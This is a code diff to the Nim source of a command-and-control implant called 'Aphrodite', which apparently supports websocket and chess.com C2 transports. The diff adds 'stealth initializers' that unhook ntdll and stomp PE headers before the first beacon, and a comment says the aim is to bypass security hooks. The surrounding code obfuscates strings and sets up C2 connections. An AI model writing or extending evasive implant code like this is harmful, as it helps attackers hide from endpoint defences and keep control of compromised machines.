@@ -2,6 +2,11 @@ import std/[json, os, strutils, times, random, base64]
 import config, crypto/aes, crypto/strenc, core/utils, core/types
 import core/jobs, proxy/socks_mgr
 
+when defined(windows) and defined(unhookNtdll):
+  import core/unhook
+when defined(windows) and defined(peStamp):
+  import core/pestamp
+
 when defined(c2ProfileWs):
   import transport/websocket
 elif defined(c2ProfileChesscom):
@@ -463,6 +468,13 @@ proc collectSocksOut(): seq[JsonNode] =
 # ---------------------------------------------------------------------------
 
 proc run*(ag: AphroditeAgent) =
+  # Stealth initializers: ntdll unhooking and PE header stomping run before
+  # any network activity so hooks are bypassed from the first beacon.
+  when defined(windows) and defined(unhookNtdll):
+    discard unhookNtdll()
+  when defined(windows) and defined(peStamp):
+    stompPeHeaders()
+
   when defined(debug): stderr.writeLine(hidstr("[*] Aphrodite starting — UUID=") & ag.payloadUUID)
   when defined(c2ProfileWs):
     when defined(debug): stderr.writeLine(hidstr("[*] C2 (WS): ws://") & WsHost & ":" & $WsPort & "/" & WsPath)
